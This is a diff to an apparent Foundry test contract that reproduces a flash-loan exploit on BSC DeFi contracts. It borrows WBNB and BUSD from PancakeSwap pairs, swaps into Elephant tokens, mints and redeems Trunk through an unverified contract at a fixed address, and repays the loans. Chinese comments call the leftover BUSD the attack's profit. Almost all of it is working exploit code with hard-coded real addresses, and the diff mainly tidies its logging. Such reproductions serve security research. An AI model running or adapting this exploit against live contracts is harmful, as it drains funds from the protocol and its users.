@@ -116,7 +116,7 @@ contract ContractTest is DSTest {
     InotVerified not_verified  = InotVerified(0xD520a3B47E42a1063617A9b6273B206a07bDf834);
 
 
-    constructor() public {
+    constructor(){
         // 各种授权
         elephant.approve(address(router), type(uint256).max);
 
@@ -140,11 +140,11 @@ contract ContractTest is DSTest {
 
     function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external{
 
+        data;
+
         if(msg.sender == BUSDT_WBNB_Pair){
-        
-            // 闪电贷借9千万BUSD
+
             IpancakePair(BUSD_USDT_Pair).swap(0, 90000000 ether,address(this), '0x00');
-            
         }else{
             attack();
         }
@@ -159,6 +159,11 @@ contract ContractTest is DSTest {
         // 10万BNB 换 elephant
         router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 100000 ether}(0, path_1, address(this), block.timestamp);
 
+        // 查询此时elephant的余额
+        uint balance_elephant =  elephant.balanceOf(address(this));
+
+        emit log_named_uint("The elephant after swapping", balance_elephant/1e9);
+
         // 用9千万busd 铸造 相应数量的 Trunk
 
         not_verified.mint(90000000 ether);
@@ -166,42 +171,34 @@ contract ContractTest is DSTest {
         // 查询此时Trunk的余额
         uint balance_Trunk = Trunk.balanceOf(address(this));
 
-        emit log_named_uint("The Trunk  after mint:",balance_Trunk);
+        emit log_named_uint("The Trunk after minting",balance_Trunk/1e18);
 
-
-        // 查询此时elephant的余额
-        uint balance_elephant =  elephant.balanceOf(address(this));
-
-        emit log_named_uint("The elephant after swap", balance_elephant);
 
         // 把全部elephant 换成 wbnb
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(balance_elephant, 0, path_2, address(this), block.timestamp);
 
         // 查看此时的WBNB余额
-        emit log_named_uint("The WBNB Balance Now:", wbnb.balanceOf(address(this)));
+        emit log_named_uint("The WBNB Balance after swaping", wbnb.balanceOf(address(this))/1e18);
 
-        // 把45000的trunk换成busd
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(45000 ether,0,path_3,address(this), block.timestamp);
 
-        // 查看此时的busd余额
-        emit log_named_uint("The BUSD swap with Trunk:", busd.balanceOf(address(this)));
-
-        
         balance_Trunk = Trunk.balanceOf(address(this));
 
         not_verified.redeem(balance_Trunk);
+
+        
+        emit log_named_uint("The BUSD after redeeming", busd.balanceOf(address(this))/1e18);
 
 
         // 获取redeem之后的elephant余额
         uint b3 =  elephant.balanceOf(address(this));
 
 
-        emit log_named_uint("The elephant after redeem", b3);
+        emit log_named_uint("The elephant after redeeming", b3/1e9);
 
         // 把redeem之后的elephant全部换成wbnb
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(b3, 0, path_2, address(this), block.timestamp);
 
-        emit log_named_uint("The WBNB Balance before payback:", wbnb.balanceOf(address(this)));
+        emit log_named_uint("The WBNB Balance before paying back", wbnb.balanceOf(address(this))/1e18);
 
         // 归还第一笔闪电贷
         wbnb.transfer(BUSDT_WBNB_Pair, 100300 ether);
@@ -210,14 +207,14 @@ contract ContractTest is DSTest {
 
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(wbnb.balanceOf(address(this)), 0, path_4, address(this), block.timestamp);
 
-        emit log_named_uint("The BUSD before pay back:", busd.balanceOf(address(this)));
+        emit log_named_uint("The BUSD before paying back", busd.balanceOf(address(this))/1e18);
 
         // 归还第二笔闪电贷
         busd.transfer(BUSD_USDT_Pair, 90300000 ether);
 
 
         // 最后的剩余BUSD就是本次攻击的全部获利
-        emit log_named_uint("The BUSD after pay back:", busd.balanceOf(address(this)));
+        emit log_named_uint("The BUSD after paying back", busd.balanceOf(address(this))/1e18);
 
     }
 
